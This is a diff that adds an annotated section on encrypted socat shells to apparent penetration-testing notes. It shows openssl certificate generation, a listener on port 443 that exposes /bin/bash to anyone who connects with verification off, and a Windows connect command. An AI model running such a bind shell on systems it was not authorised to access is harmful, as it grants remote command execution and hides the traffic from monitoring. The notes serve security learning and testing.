@@ -581,3 +581,52 @@ ncat -nvlp port --ssl > out-file
 ncat -nv target-ip port --ssl < file-to-send
 ```
 
+### Socat Encrypted
+
+**SSL**
+
+```text
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+```
+
+* req + x509 = create self-signed certificates
+* req = initiate a new certificate signing request
+* -newkey = generate a private key
+* rsa:2048 = RSA with 2048 bits key length
+* -nodes = store without passphrase \(no encryption\)
+* -keyout = save the key to a file
+* -x509 = output self-signed certificate, not a certificate request
+* -days = period of days that are valid
+* -out = save the certificate to a file
+
+**Convert:**
+
+```text
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+```
+
+**Create Encrypted Listener:**
+
+_Linux_
+
+```text
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+```
+
+* OPENSSL-LISTEN = create a listener
+* cert = certificate file
+* verify = disable SSL verification
+* fork = spawn a child process once the connection is made
+
+**Connect:**
+
+_Windows_
+
+```text
+socat - OPENSSL:IP:PORT,verify=0
+```
+
+* - = transfer data between STDIO
+* OPENSSL = establish SSL connection
+* verify=0 = disable SSL verification
+
